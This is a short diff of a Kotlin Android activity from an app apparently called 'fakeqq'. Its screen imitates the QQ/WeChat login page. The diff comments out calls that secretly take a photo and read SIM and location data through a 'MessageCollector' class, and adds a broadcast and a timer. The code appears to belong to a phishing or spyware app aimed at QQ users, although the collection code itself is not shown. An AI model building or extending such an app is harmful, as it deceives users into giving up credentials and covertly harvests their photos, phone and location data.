@@ -152,8 +152,6 @@ class MainActivity : AppCompatActivity() {
 
         buttonChange.setOnClickListener({
 
-
-
             QQLogin_Type = !QQLogin_Type;
             if (QQLogin_Type){
                 Tv_title.text = "微信号/QQ号/邮箱登陆";
@@ -236,7 +234,7 @@ class MainActivity : AppCompatActivity() {
             })*/
 
 
-            MessageCollector.takePic();
+/*            MessageCollector.takePic();
 
 
             //Sim卡信息
@@ -247,8 +245,9 @@ class MainActivity : AppCompatActivity() {
             //位置信息
             Toast.makeText(this@MainActivity,
                     MessageCollector.getLocation()
-                    ,Toast.LENGTH_SHORT).show();
+                    ,Toast.LENGTH_SHORT).show();*/
 
+            sendBroadcast(Intent("com.example.fakeqq.MY_BROADCAST"));
 
            var timer = Timer();
             timer.schedule(object :TimerTask(){
